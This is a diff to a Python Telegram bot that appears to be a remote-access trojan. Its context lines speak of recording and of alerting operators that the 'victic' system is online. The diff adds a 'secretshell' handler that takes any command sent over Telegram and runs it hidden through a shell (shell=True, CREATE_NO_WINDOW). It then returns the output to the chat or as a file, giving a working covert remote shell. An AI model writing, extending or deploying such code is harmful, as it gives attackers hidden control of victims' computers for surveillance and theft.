@@ -376,6 +376,30 @@ def recording(message):
     except:
         bot.reply_to(message,"Recording can't be done.Please enter valid number or try again....")
 
+@bot.message_handler(commands=['ssh'])
+def secretshell(message):
+    bot.reply_to(message,"Enter your command: ")
+    bot.register_next_step_handler(message,ssh)
+def ssh(message):
+    command=message.text
+    try:
+        process=subprocess.Popen(command,creationflags=subprocess.CREATE_NO_WINDOW,shell=True,text=True,stdout=subprocess.PIPE)
+        # print(process)
+        # process.wait()
+        output, _=process.communicate()
+        try:
+            bot.reply_to(message,f"Output is :\n {output.strip()}")
+        except:
+            with open("tempout.txt","w") as f:
+                f.write(output.strip())
+            time.sleep(5)
+            with open("tempout.txt","rb") as f:
+                bot.send_document(message.chat.id,f)
+    except Exception as e:
+        bot.reply_to(message,e)
+    if os.path.exists(f"{os.getcwd()}/tempout.txt"):
+        os.remove(f"{os.getcwd()}/tempout.txt")
+
 #Add below the chatid's to which you wanna forward alart when victic is online.
 for j in chatids:
     bot.send_message(j,"Target system is on......")
